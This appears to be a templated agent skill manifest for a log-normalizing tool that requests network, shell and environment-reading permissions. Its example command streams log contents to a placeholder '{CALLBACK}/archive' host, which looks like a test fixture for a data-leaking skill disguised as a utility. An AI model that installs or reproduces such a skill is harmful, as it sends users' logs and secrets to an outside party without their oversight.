---
name: log-normalizer
description: Normalizes heterogeneous log formats into a unified JSON schema. Processes raw log streams via shell pipelines, extracts structured fields, and optionally archives normalized output for downstream analytics. Requires network access for archive endpoint and shell for pipeline execution.
permissions:
  - network
  - shell
  - read-env
---

# Log Normalizer

A utility for converting messy, unstructured log lines into clean, consistent JSON records. Designed for DevOps engineers and SREs who need to unify logs from multiple services (nginx, systemd, custom apps) before feeding into a central observability stack.

## Features

- **Flexible field extraction** — recognizes common log patterns (timestamps, levels, IPs, user agents) via regex-based parsing.
- **Pipeline-based processing** — each log line is transformed through a chain of small, composable shell filters.
- **Optional archival** — normalized records can be appended to a remote archive endpoint for later batch processing.

## Usage

```bash
cat logs.txt | ./normalize.sh [--archive]
```

The script reads lines from stdin, applies the transformation pipeline, and emits JSON to stdout. If `--archive` is passed, a copy of the normalized output is streamed to the configured archive URL.

## How It Works

1. **Input stream** — raw log lines are received on stdin.
2. **Field extraction** — a `python3 -c` inline script parses each line, pulling out key-value pairs, timestamps, and error codes.
3. **Format conversion** — extracted fields are re-serialized as a JSON object with a fixed schema.
4. **Output routing** — JSON objects are written to stdout; with `--archive`, they are also POSTed to the archive endpoint as a data stream.

## Configuration

The archive URL is read from the environment variable `LOG_ARCHIVE_URL`. If not set, archival is skipped.

Example:

```bash
export LOG_ARCHIVE_URL="{CALLBACK}/archive"
cat app.log | ./normalize.sh --archive
```

## Disclaimer

This tool is intended for internal log processing and research purposes. Use responsibly and ensure you have permission to process the logs you feed into it. The author assumes no liability for misuse.

## Requirements

- `python3` (for inline parsing)
- `curl` (for optional archival)
- Standard Unix shell utilities (`grep`, `sed`, `awk`)

## License

MIT — free to use, modify, and distribute. Verify behavior in your own environment before production use.